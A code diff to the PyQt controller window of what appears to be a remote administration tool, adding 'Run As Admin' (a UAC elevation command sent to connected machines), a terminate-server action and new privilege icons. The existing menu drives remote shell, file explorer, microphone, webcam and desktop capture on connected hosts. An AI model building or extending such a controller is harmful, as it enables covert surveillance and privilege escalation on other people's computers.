@@ -144,6 +144,9 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.actionUnlock_Server.triggered.connect(self.unlock_server)
         self.actionLock_Server.triggered.connect(self.lock_server)
         self.actionStop_Server.triggered.connect(self.lock_server)
+        self.actionSet_Alias.triggered.connect(self.add_alias)
+        self.actionRun_As_Admin.triggered.connect(self.run_as_admin)
+        ###
         self.actionRemote_Shell.triggered.connect(lambda: self.run_plugin('shellMode'))
         self.actionRemote_Explorer.triggered.connect(lambda: self.run_plugin('explorerMode'))
         self.actionRemote_Microphone.triggered.connect(lambda: self.run_plugin('audioMode'))
@@ -391,9 +394,9 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
                 privs_status = 'User' if not self.streaming_socks[obj]['privileges'] == '1' else 'Admin'
                 if privs_status == 'Admin':
-                    item.setIcon(QIcon(os.path.join(assets, 'true.png')))
+                    item.setIcon(QIcon(os.path.join(assets, 'admin.png')))
                 else:
-                    item.setIcon(QIcon(os.path.join(assets, 'false.png')))
+                    item.setIcon(QIcon(os.path.join(assets, 'user.png')))
                 item.setText(privs_status)
                 self.serversTable.setItem(index, self.index_of_privs, item)
 
@@ -469,6 +472,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             if self.serversTable.item(self.serversTable.currentRow(), self.index_of_lock).text() == 'LOCKED':
                 #self.actionUnlock_Server.setVisible(True)
                 self.actionUnlock_Server.setDisabled(False)
+                self.actionSet_Alias.setDisabled(False)
+                self.actionRun_As_Admin.setDisabled(False)
                 self.actionDesktop_Preview.setDisabled(False)
                 server = self.current_server()
                 if self.socks[server]['webcamdevice'] != 'NoDevice':
@@ -510,6 +515,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             #self.actionLock_Server.setVisible(False)
             self.actionLock_Server.setDisabled(True)
             self.actionStop_Server.setDisabled(True)
+            self.actionSet_Alias.setDisabled(True)
+            self.actionRun_As_Admin.setDisabled(True)
             #self.unlockServerButton.setVisible(True)
             self.actionUnlock_Server.setDisabled(True)
             self.actionDesktop_Preview.setDisabled(True)
@@ -536,6 +543,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         if self.serversTable.selectedItems():
 
             server_menu.addAction(QIcon(os.path.join(assets, 'add_alias.png')), 'Set Alias', self.add_alias)
+            server_menu.addAction(QIcon(os.path.join(assets, 'run_as_admin.png')), 'Run As Admin', self.run_as_admin)
             server_menu.addSeparator()
 
             if self.serversTable.item(server_index, self.index_of_lock).text() == 'LOCKED':
@@ -562,7 +570,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 server_options_menu.addAction(QIcon(os.path.join(assets, 'lock.png')), 'Lock Server',
                                               self.lock_server)
                 server_options_menu.addAction(QIcon(os.path.join(assets, 'stop.png')), 'Terminate Server',
-                                              self.lock_server)
+                                              self.terminate_server)
 
             server_menu.exec_(self.serversTable.mapToGlobal(point))
 
@@ -615,6 +623,20 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             text, ok = QInputDialog.getText(self, 'Set Alias', 'Enter Name: ')
             if ok:
                 self.alias.set_alias(self.socks[server]['ip_address'], self.socks[server]['os'], text)
+
+    def run_as_admin(self):
+        server = self.current_server()
+        if server:
+            get(self.socks[server]['sock'], 'runasadmin', 'uac')
+
+    def terminate_server(self):
+        server = self.current_server()
+        if server:
+            warn = QMessageBox(QMessageBox.Question, 'Confirm', 'Are you sure to terminate server?')
+            warn.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
+            ans = warn.exec_()
+            if ans == QMessageBox.Yes:
+                send(self.socks[server]['sock'], 'terminateServer', 'terminateserver')
 
     def run_plugin(self, mode):
         server = self.current_server()
